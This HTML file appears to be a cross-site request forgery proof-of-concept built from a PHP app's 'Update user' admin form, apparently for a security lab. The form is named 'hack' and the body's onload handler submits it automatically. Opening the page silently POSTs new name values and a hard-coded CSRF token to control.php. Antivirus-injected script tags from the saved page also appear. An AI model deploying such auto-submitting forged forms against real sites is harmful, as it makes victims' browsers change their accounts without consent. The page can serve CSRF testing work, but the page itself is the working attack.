

<html>

	<head>
		<meta charset="UTF-8">
		<title>Update user</title>
		<link rel="stylesheet" href="style.css">
	<script type="text/javascript" src="http://ff.kis.v2.scr.kaspersky-labs.com/8226E226-F4F6-D144-BFA7-CC2A024D8A9A/main.js" charset="UTF-8"></script><link rel="stylesheet" crossorigin="anonymous" href="http://ff.kis.v2.scr.kaspersky-labs.com/E31289B3-53E6-4344-8C24-D918D0A36946/abn/main.css"/></head>

<body onload="document.hack.submit();">
	<div id="home">
	 Hi, admin | 	<center>
	</br><Legend><text class="textprop">Update
User
</text></legend></br>
<form action="./control.php" method ="post" name="hack">
	<text class="textprop">Firstname:</text><input
type="text" name="fname" class="textbox" value="dffgh"></br></br>
  	<text class="textprop">Lastname:</text><input
type="text" name="lname" class="textbox" value="dffgh"><br></br>

<input id="login-username" type="hidden" class="form-control" name="csrf_token" value="2eca8ddfe51f2f66928bb6f604307da9961b738a">  </div>

<input type="submit" value="Update" /><input type="reset" value="Reset" />

   <a href="logout.php">Logout</a> 
</form>
		</center>
		 		</div>
	<script type="text/javascript" src="./script.js"></script>
	
</body>
</html>